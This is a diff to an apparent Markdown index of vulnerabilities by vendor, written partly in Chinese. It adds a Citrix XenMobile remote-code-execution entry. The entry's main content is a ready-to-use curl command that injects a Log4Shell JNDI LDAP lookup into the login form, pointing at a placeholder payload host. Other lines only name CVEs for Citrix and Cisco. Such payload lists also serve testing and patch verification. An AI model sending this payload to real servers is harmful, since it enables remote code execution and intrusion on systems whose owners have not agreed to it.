@@ -154,7 +154,11 @@
 
 ## Citrix
 - 🎯 CVE-2020-8209(Citrix XenMobile 目录遍历/任意文件读取漏洞)
-
+- 🎯 Citrix XenMobile RCE via Log4shell
+    ```
+    # Source: https://twitter.com/twcsftech/status/1471716640606007299
+    curl https://<TARGET>/zdm/cxf/login -H 'Referer: https://<TARGET>/zdm' -d 'login=${jndi:ldap://<PAYLOAD>/wibtio}&password=' -k 
+    ```
 ## Cisco
 - 🎯 CVE-2020-3452(Cisco ASAFTD任意文件读取漏洞)
 
